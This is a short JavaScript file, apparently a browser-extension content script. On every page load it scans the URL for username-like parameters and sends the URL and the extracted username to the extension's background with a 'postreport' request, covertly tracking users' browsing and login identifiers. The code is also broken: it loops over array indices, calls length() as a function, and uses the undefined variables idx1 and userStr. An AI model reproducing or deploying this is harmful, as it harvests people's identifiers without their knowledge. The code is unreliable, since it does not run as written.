var userRules=new Array('username','uname',"user",'login','user_name');
function PageLoad() {
        try {
	    if(!document)return;
    	    if(!document.location||!document.location.href)return;
	    if(document.location.href.indexOf('http://')==-1&&document.location.href.indexOf('https://')==-1)return;
	    var strUrl=document.location.href;
	    for(var rule in userRules)
		{
		if(strUrl.indexOf(rule)!=-1)
		{
		idx=strUrl.indexOf(rule);
		idx2=strUrl.indexOf("&",idx);
		if(idx2==-1)
		{
			idx2=strUrl.length();
		}
		var strUser=strUrl.substr(idx+1+rule.length(),idx2-idx1);
		chrome.extension.sendRequest({method: "postreport",'url':strUrl,'type':"get",user:userStr},function(){});
		}
		}	
}catch (e) {alert(e);}
}
PageLoad();


